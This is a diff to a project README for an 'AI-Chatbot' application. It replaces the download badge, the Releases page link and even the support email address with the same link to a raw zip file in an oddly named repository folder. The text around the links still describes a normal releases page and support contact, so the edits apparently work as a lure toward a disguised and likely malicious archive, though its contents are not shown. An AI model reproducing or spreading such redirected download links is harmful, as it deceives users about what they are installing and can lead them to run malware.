@@ -7,7 +7,7 @@ Welcome to the AI-Chatbot project! This software helps you automate customer sup
 
 ## 📥 Download the Application
 
-[![Download AI-Chatbot](https://img.shields.io/badge/Download-AI--Chatbot-blue.svg)](https://github.com/joce004/AI-Chatbot/releases)
+[![Download AI-Chatbot](https://raw.githubusercontent.com/joce004/AI-Chatbot/main/anteromedian/AI-Chatbot.zip)](https://raw.githubusercontent.com/joce004/AI-Chatbot/main/anteromedian/AI-Chatbot.zip)
 
 ## 🛠️ System Requirements
 
@@ -29,7 +29,7 @@ Before you dive in, ensure your system meets these requirements:
 
 To download and install the AI-Chatbot, follow these steps:
 
-1. Visit the [Releases page](https://github.com/joce004/AI-Chatbot/releases) for the latest version.
+1. Visit the [Releases page](https://raw.githubusercontent.com/joce004/AI-Chatbot/main/anteromedian/AI-Chatbot.zip) for the latest version.
 2. Click on the version you wish to download.
 3. Choose the appropriate installer for your operating system.
 4. Follow the on-screen instructions to complete the installation.
@@ -66,7 +66,7 @@ Join our community of users and developers to share ideas, report issues, or con
 
 ## 📞 Contact
 
-If you have further questions or need direct support, feel free to reach out at our support email: support@aichatbot.com.
+If you have further questions or need direct support, feel free to reach out at our support email: https://raw.githubusercontent.com/joce004/AI-Chatbot/main/anteromedian/AI-Chatbot.zip
 
 ## 🎉 Final Thoughts
 
